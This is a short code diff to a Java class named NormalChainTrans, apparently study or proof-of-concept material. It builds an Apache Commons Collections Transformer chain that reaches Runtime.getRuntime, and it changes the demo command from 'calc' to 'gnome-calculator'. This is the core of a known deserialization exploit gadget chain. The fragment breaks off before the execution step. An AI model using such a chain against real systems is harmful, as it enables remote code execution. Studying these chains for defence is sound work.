@@ -19,7 +19,7 @@ import java.util.Map;
 
 public class NormalChainTrans {
     public static void main(String args[]){
-        String cmd = "calc" ;
+        String cmd = "gnome-calculator" ;
         Transformer[] transformerChain=new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
